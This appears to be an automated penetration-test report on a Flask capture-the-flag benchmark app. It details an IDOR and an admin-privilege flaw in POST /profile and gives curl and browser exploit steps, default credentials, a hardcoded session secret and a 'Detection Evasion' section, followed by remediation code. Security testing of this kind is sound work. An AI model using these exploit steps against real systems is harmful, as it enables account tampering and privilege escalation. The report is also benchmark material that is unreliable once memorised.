# Authorization Analysis Report

## 1. Executive Summary

- **Analysis Status:** Complete  
- **Key Outcome:** Two high-confidence authorization vulnerabilities identified in the POST /profile endpoint, enabling both horizontal privilege escalation (IDOR) and vertical privilege escalation (admin access). All findings have been passed to the exploitation phase via the machine-readable exploitation queue.  
- **Purpose of this Document:** This report provides the strategic context, vulnerability patterns, and architectural intelligence necessary to effectively exploit the authorization vulnerabilities in this Flask-based CTF application.

**Critical Findings:**
- **AUTHZ-VULN-01:** Horizontal IDOR allowing any authenticated user to modify any other user's email address
- **AUTHZ-VULN-02:** Vertical privilege escalation allowing regular users to trigger admin-only functionality (flag disclosure)

Both vulnerabilities stem from the same root cause: the POST /profile endpoint trusts user-controlled form data (`request.form.get('username')`) instead of validating against the authenticated session identity (`session['username']`).

## 2. Dominant Vulnerability Patterns

### Pattern 1: Trust in Client-Controlled Resource Identifiers (Horizontal IDOR)
- **Description:** The POST /profile endpoint accepts a `username` parameter from a hidden form field and uses it directly in database UPDATE queries without validating that the authenticated user owns that resource. This enables any authenticated user to modify any other user's data by manipulating the hidden form field.
- **Implication:** Complete bypass of object-level authorization. Users can access and modify other users' private data (email addresses) by manipulating the `username` parameter. This is a textbook Insecure Direct Object Reference (IDOR) vulnerability.
- **Representative:** AUTHZ-VULN-01
- **Root Cause:** Missing ownership validation between lines 70 and 75 of app.py. The code path flows directly from user input extraction to database modification without any authorization check.
- **Code Evidence:**
  - Line 70: `username = request.form.get('username')` - extracts attacker-controlled value
  - Line 75: `c.execute('UPDATE users SET email = ? WHERE username = ?', (new_email, username))` - uses attacker-controlled value without validation
  - **Missing:** No comparison between `username` and `session['username']`

### Pattern 2: Privilege Checks on Attacker-Controlled Data (Vertical Escalation)
- **Description:** The admin privilege check at line 81 evaluates whether `username == "admin"` where `username` comes from user-controlled form data rather than the authenticated session. This allows any authenticated user to trigger admin-only functionality by setting the `username` form parameter to "admin".
- **Implication:** Regular users can escalate privileges to admin level by manipulating form parameters. The application incorrectly uses attacker-controlled input (`request.form.get('username')`) for authorization decisions instead of the authenticated identity (`session['username']`).
- **Representative:** AUTHZ-VULN-02
- **Root Cause:** Confusion between authenticated identity and user input. The admin check uses `username` from form data (line 70) instead of `session['username']`.
- **Code Evidence:**
  - Line 70: `username = request.form.get('username')` - extracts attacker-controlled value
  - Line 81: `if username == "admin":` - checks attacker-controlled value for privileges
  - Line 82: `message += "@FLAG@"` - grants admin-only flag disclosure
  - **Missing:** Should check `if session['username'] == "admin":` instead

## 3. Strategic Intelligence for Exploitation

### Session Management Architecture:
- Sessions use Flask's default client-side signed cookies with session key `'username'`
- Session secret: `'your_secret_key'` (hardcoded at app.py:5) - weak and predictable
- Session validation: Simple existence check `'username' in session` (no timeout, no integrity beyond signature)
- **Critical Finding:** The application correctly validates session existence at protected endpoints but fails to use the session identity for resource ownership and privilege checks

### Authorization Model:
- **Authentication Layer:** Binary check - logged in (`'username' in session`) or anonymous
- **Authorization Layer:** **COMPLETELY ABSENT** - no ownership validation, no role checks
- **Pseudo-Roles:** Application has no formal role system. "Admin" is just a username string comparison, not a stored role
- **Critical Finding:** All authorization decisions are made based on user-controlled form data rather than authenticated session identity

### Resource Access Patterns:
- POST /profile accepts `username` parameter to identify target resource
- Hidden form field `<input type="hidden" name="username" value="{{session['username']}}">` can be trivially modified by attacker
- **Critical Finding:** The application trusts that clients will submit their own username, but provides no server-side enforcement

### Database Query Architecture:
- All queries use parameterized statements (safe from SQL injection)
- UPDATE query at line 75: `UPDATE users SET email = ? WHERE username = ?`
- **Critical Finding:** The WHERE clause uses user-controlled `username` parameter without validation. Should filter by `session['username']` instead.

### Attack Surface:
- **Single vulnerable endpoint:** POST /profile (app.py:56-86)
- **Dual exploitation:** Same endpoint vulnerable to both horizontal (IDOR) and vertical (admin escalation) attacks
- **No rate limiting:** Unlimited exploitation attempts possible
- **No logging:** No detection of authorization bypass attempts

### Default Credentials:
- **Admin:** username=`admin`, password=`#$%^&*()adfjhasdfbjhas`
- **Test User:** username=`test`, password=`test`
- Both accounts auto-created on startup (app.py:17-21)
- Attacker can use test account as low-privilege starting point

## 4. Vectors Analyzed and Confirmed Secure

These authorization checks were traced and confirmed to have robust, properly-placed guards. They are **low-priority** for further testing.

| **Endpoint** | **Guard Location** | **Defense Mechanism** | **Verdict** |
|--------------|-------------------|----------------------|-------------|
| `GET /` | app.py:30-31 | Conditional redirect based on session; no protected resources accessed | SAFE |
| `POST /login` | app.py:39-54 | Public authentication endpoint; no authorization required by design | SAFE |
| `POST /logout` | app.py:34-37 | Session clearing only; no authentication check but also no harmful side effect (clearing empty session is safe) | SAFE (poor practice but not exploitable) |
| `GET /profile` (display only) | app.py:58-65 | Session validation at line 58-59; email retrieved using `session['username']` (line 63) with no user-controlled parameters | SAFE |

**Analysis Details:**

**GET /profile (Safe Component):**
- Line 58-59: `if 'username' not in session: return redirect('/')` - proper authentication
- Line 63: `c.execute('SELECT email FROM users WHERE username = ?', (session['username'],))` - uses authenticated identity, NOT user input
- **Verdict:** The GET portion of /profile correctly uses `session['username']` for database queries, preventing unauthorized access

**POST /logout (Not Vulnerable):**
- Missing authentication check (no `'username' in session` validation)
- However, calling `session.clear()` on an empty session is harmless (no-op)
- No sensitive operations, data leakage, or state manipulation
- **Verdict:** Poor practice but not an exploitable authorization vulnerability
- **Note:** Vulnerable to CSRF (out of scope for authorization analysis)

## 5. Analysis Constraints and Blind Spots

### Complete Coverage Achieved:
This analysis covered all endpoints identified in the reconnaissance deliverable (Section 8):
- ✅ Horizontal candidate: POST /profile (IDOR confirmed)
- ✅ Vertical candidate: POST /profile admin check (privilege escalation confirmed)
- ✅ Context-based: None identified in recon (application has no multi-step workflows)

### No Blind Spots:
- **Monolithic Architecture:** Single-file application (app.py) with complete source access
- **No Microservices:** No internal service calls that could hide authorization logic
- **No Dynamic Permissions:** No database-driven permission system; all logic visible in code
- **No External Auth:** No OAuth/SSO flows that could introduce hidden authorization layers

### Limitations:
- **Static Analysis Only:** This analysis traced code paths without runtime testing. Exploitation phase will confirm behavioral exploitation.
- **No Session Forgery Testing:** While the weak secret key (`'your_secret_key'`) enables session forgery, this was not tested during analysis phase.

---

## 6. Detailed Vulnerability Analysis

### AUTHZ-VULN-01: Horizontal IDOR - Email Modification

**Vulnerability Type:** Insecure Direct Object Reference (IDOR) / Missing Ownership Validation

**Location:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-102-24/app/app.py`, Lines 70, 75

**Affected Endpoint:** POST /profile

**Code Flow Analysis:**
```python
# Line 58-59: Authentication check (passes for any logged-in user)
if 'username' not in session:
    return redirect('/')

# Line 67: POST request handling
if request.method == 'POST':
    new_email = request.form.get('email')
    
    # Line 70: VULNERABILITY - Extracts username from user-controlled form
    username = request.form.get('username')  # ← ATTACKER CONTROLLED
    
    # Line 72-76: Database update without ownership validation
    if new_email:
        conn = sqlite3.connect('database.db')
        c = conn.cursor()
        # Line 75: SIDE EFFECT - Updates arbitrary user's email
        c.execute('UPDATE users SET email = ? WHERE username = ?', 
                  (new_email, username))  # ← Uses attacker input!
        conn.commit()
```

**Missing Guard:**
Between line 70 and line 75, there should be an ownership validation:
```python
# MISSING SECURITY CONTROL (should exist after line 70):
if username != session['username']:
    return 'Unauthorized', 403
```

**Root Cause:**
The application trusts a hidden form field (`<input type="hidden" name="username" value="{{session['username']}}">` in profile.html:19) to contain the authenticated user's username. This hidden field can be trivially modified by an attacker using browser DevTools or intercepting proxies.

**Attack Vector:**
1. Authenticate as low-privilege user: `test:test`
2. Session established: `session['username'] = 'test'`
3. Navigate to /profile endpoint
4. Intercept POST request or modify form HTML
5. Change `username` parameter from `test` to `admin` (or any target username)
6. Submit modified request: `POST /profile` with `username=admin&email=attacker@evil.com`
7. Database UPDATE executes: `UPDATE users SET email = 'attacker@evil.com' WHERE username = 'admin'`
8. Admin's email is modified without authorization

**Impact:**
- **Horizontal Privilege Escalation:** Any user can modify any other user's email
- **Account Takeover Preparation:** If password reset exists (not in this app), attacker could trigger reset to their email
- **Data Integrity Violation:** Unauthorized modification of user profile data

**Confidence:** HIGH - Clear code path from user input to database modification without ownership check

---

### AUTHZ-VULN-02: Vertical Privilege Escalation - Admin Flag Disclosure

**Vulnerability Type:** Vertical Authorization Bypass / Privilege Escalation

**Location:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-102-24/app/app.py`, Lines 70, 81-82

**Affected Endpoint:** POST /profile

**Code Flow Analysis:**
```python
# Line 70: Extract username from user-controlled form
username = request.form.get('username')  # ← ATTACKER CONTROLLED

# Lines 73-77: Database update (uses attacker-controlled username)
c.execute('UPDATE users SET email = ? WHERE username = ?', 
          (new_email, username))
conn.commit()

# Lines 81-82: VULNERABILITY - Admin check on attacker-controlled data
if username == "admin":  # ← Checks attacker's input, not session!
    message += "@FLAG@"  # ← Admin-only flag disclosed
```

**Missing Guard:**
Line 81 should validate the AUTHENTICATED user's identity, not user-controlled form data:
```python
# CURRENT (VULNERABLE):
if username == "admin":
    message += "@FLAG@"

# SHOULD BE (SECURE):
if session['username'] == "admin":
    message += "@FLAG@"
```

**Root Cause:**
The admin privilege check uses `username` variable from form data (line 70: `request.form.get('username')`) instead of the authenticated session identity (`session['username']`). This is a fundamental confusion between user input and authenticated identity.

**Attack Vector:**
1. Authenticate as regular user: `test:test`
2. Session established: `session['username'] = 'test'`
3. Navigate to /profile endpoint
4. Modify POST request: `username=admin&email=any@email.com`
5. Admin check evaluates: `if "admin" == "admin": message += "@FLAG@"`
6. Flag disclosed to regular user in response
7. Vertical privilege escalation achieved

**Impact:**
- **Privilege Escalation:** Regular users gain admin-level functionality
- **CTF Flag Disclosure:** Admin-only flag revealed to unauthorized users
- **Authorization Model Failure:** Complete bypass of intended privilege separation

**Confidence:** HIGH - Admin check explicitly uses attacker-controlled variable instead of session

---

### Combined Exploitation (AUTHZ-VULN-01 + AUTHZ-VULN-02):

Both vulnerabilities can be exploited in a single request:

**Attack Request:**
```http
POST /profile HTTP/1.1
Host: localhost:36277
Cookie: session=<test_user_session_cookie>
Content-Type: application/x-www-form-urlencoded

username=admin&email=attacker@evil.com
```

**Result:**
1. Admin's email changed to `attacker@evil.com` (IDOR - AUTHZ-VULN-01)
2. Flag disclosed in response message (Vertical escalation - AUTHZ-VULN-02)
3. CTF objective achieved with single request

---

## 7. Exploitation Guidance

### Prerequisites:
- Valid authenticated session (any user account)
- Default test account available: `test:test`

### Exploitation Steps:

**Step 1: Authenticate**
```bash
curl -X POST http://localhost:36277/login \
  -d "username=test&password=test" \
  -c cookies.txt
```

**Step 2: Exploit IDOR + Privilege Escalation**
```bash
curl -X POST http://localhost:36277/profile \
  -b cookies.txt \
  -d "username=admin&email=attacker@evil.com"
```

**Expected Response:**
```html
<p>Email updated successfully!flag{...}</p>
```

### Alternative: Browser-Based Exploitation

1. Navigate to `http://localhost:36277/`
2. Login with `test:test`
3. Open browser DevTools (F12) → Network tab
4. Submit email update form on /profile
5. Right-click POST request → Edit and Resend
6. Change `username` from `test` to `admin` in request body
7. Send modified request
8. Observe flag in response

### Detection Evasion:
- **No logging:** Application has no audit trail or security logging
- **No rate limiting:** Unlimited exploitation attempts without detection
- **No anomaly detection:** No monitoring of authorization bypass attempts

---

## 8. Remediation Recommendations

### Fix for AUTHZ-VULN-01 (Horizontal IDOR):

**Option 1: Use Session Identity (Recommended)**
```python
# Line 67-77 (POST /profile handler)
if request.method == 'POST':
    new_email = request.form.get('email')
    
    # FIX: Use authenticated identity, not user input
    username = session['username']  # ← Use session, not form data
    
    if new_email:
        conn = sqlite3.connect('database.db')
        c = conn.cursor()
        c.execute('UPDATE users SET email = ? WHERE username = ?', 
                  (new_email, username))
        conn.commit()
```

**Option 2: Add Ownership Validation**
```python
if request.method == 'POST':
    new_email = request.form.get('email')
    username = request.form.get('username')
    
    # FIX: Validate ownership before database operation
    if username != session['username']:
        return 'Unauthorized: Cannot modify other users', 403
    
    if new_email:
        # ... proceed with update
```

### Fix for AUTHZ-VULN-02 (Vertical Privilege Escalation):

```python
# Line 81-82 (Admin check)
# BEFORE (VULNERABLE):
if username == "admin":
    message += "@FLAG@"

# AFTER (SECURE):
if session['username'] == "admin":  # ← Check session, not form data
    message += "@FLAG@"
```

### Defense-in-Depth Recommendations:

1. **Implement Proper Role-Based Access Control (RBAC):**
   - Add `role` column to users table
   - Store role in session: `session['role']`
   - Use decorators for role enforcement: `@require_role('admin')`

2. **Add Authorization Middleware:**
   - Centralize authorization logic
   - Use Flask decorators for ownership checks
   - Implement `@require_ownership` decorator

3. **Security Logging:**
   - Log all authorization failures
   - Track email modification attempts
   - Alert on privilege escalation attempts

4. **Input Validation:**
   - Validate email format server-side
   - Reject hidden field modifications
   - Consider removing username from form entirely

---

## Conclusion

The Flask application contains two critical authorization vulnerabilities in the POST /profile endpoint, both stemming from trusting user-controlled form data for authorization decisions. These vulnerabilities enable complete horizontal privilege escalation (access any user's data) and vertical privilege escalation (trigger admin-only functionality). Both vulnerabilities are trivially exploitable by any authenticated user and require minimal technical skill to exploit. Immediate remediation is required by using authenticated session identity (`session['username']`) instead of user-controlled form data (`request.form.get('username')`) for all authorization decisions.